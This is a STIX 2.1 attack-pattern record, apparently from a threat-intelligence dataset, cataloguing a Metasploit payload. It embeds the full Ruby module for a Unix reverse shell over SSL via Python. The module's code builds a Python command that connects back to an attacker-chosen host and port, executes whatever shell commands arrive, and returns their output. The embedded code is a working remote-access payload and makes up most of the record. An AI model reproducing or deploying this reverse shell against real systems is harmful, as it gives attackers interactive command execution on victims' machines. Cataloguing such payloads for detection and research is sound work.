{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e0198a20-4b6e-42da-b7da-3314b2c8b216",
    "created": "2024-08-14T16:33:19.320687Z",
    "modified": "2024-08-14T16:33:19.320691Z",
    "name": "Unix Command Shell, Reverse TCP SSL (via python)",
    "description": "Creates an interactive shell via python, uses SSL, encodes with base64 by design.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/cmd/unix/reverse_python_ssl.rb",
            "external_id": "reverse_python_ssl.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = :dynamic\n\n  include Msf::Payload::Single\n  include Msf::Payload::Python\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n     'Name'          => 'Unix Command Shell, Reverse TCP SSL (via python)',\n     'Description'   => 'Creates an interactive shell via python, uses SSL, encodes with base64 by design.',\n     'Author'        => 'RageLtMan <rageltman[at]sempervictus>',\n     'License'       => BSD_LICENSE,\n     'Platform'      => 'unix',\n     'Arch'          => ARCH_CMD,\n     'Handler'       => Msf::Handler::ReverseTcpSsl,\n     'Session'       => Msf::Sessions::CommandShell,\n     'PayloadType'   => 'cmd',\n     'RequiredCmd'   => 'python',\n     'Payload'       =>\n       {\n         'Offsets' => { },\n         'Payload' => ''\n       }\n    ))\n    register_advanced_options(\n      [\n        OptString.new('PythonPath', [true, 'The path to the Python executable', 'python'])\n      ]\n    )\n  end\n\n  #\n  # Constructs the payload\n  #\n  def generate(_opts = {})\n    vprint_good(command_string)\n    return super + command_string\n  end\n\n  #\n  # Returns the command string to use for execution\n  #\n  def command_string\n    cmd = ''\n    dead = Rex::Text.rand_text_alpha(2)\n    # Set up the socket\n    cmd += \"import socket,subprocess,os,ssl\\n\"\n    cmd += \"so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\\n\"\n    cmd += \"so.connect(('#{ datastore['LHOST'] }',#{ datastore['LPORT'] }))\\n\"\n    cmd += \"s=ssl.wrap_socket(so)\\n\"\n    # The actual IO\n    cmd += \"#{dead}=False\\n\"\n    cmd += \"while not #{dead}:\\n\"\n    cmd += \"\\tdata=s.recv(1024)\\n\"\n    cmd += \"\\tif len(data)==0:\\n\\t\\t#{dead} = True\\n\"\n    cmd += \"\\tproc=subprocess.Popen(data.decode('utf-8'),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)\\n\"\n    cmd += \"\\tstdout_value=proc.stdout.read() + proc.stderr.read()\\n\"\n    cmd += \"\\ts.send(stdout_value)\\n\"\n    \"#{datastore['PythonPath']} -c \\\"#{ py_create_exec_stub(cmd) }\\\"\"\n  end\nend\n",
    "x_mitre_platforms": [
        "unix'"
    ]
}